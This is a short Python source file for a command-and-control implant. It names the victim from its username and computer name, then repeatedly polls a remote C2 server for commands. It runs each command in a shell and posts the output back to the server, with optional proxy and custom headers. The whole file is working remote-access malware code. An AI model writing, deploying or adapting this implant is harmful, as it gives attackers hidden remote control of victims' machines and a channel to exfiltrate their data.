from time import time, sleep
from requests import get, post, exceptions
from subprocess import run, PIPE, STDOUT
from settings import PORT, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
from os import getenv, chdir

client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)

    except exceptions.RequestException:
        sleep(DELAY)
        continue

    command = response.content.decode()
    if command.startswith("cd "):
        directory = command[3:]
        chdir(directory)

    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout

    post(f"http://{C2_SERVER}:{PORT}{CMD_RESPONSE}", data={CMD_RESPONSE_KEY: command_output}, headers=HEADER,
         proxies=PROXY)

    print(response.status_code)
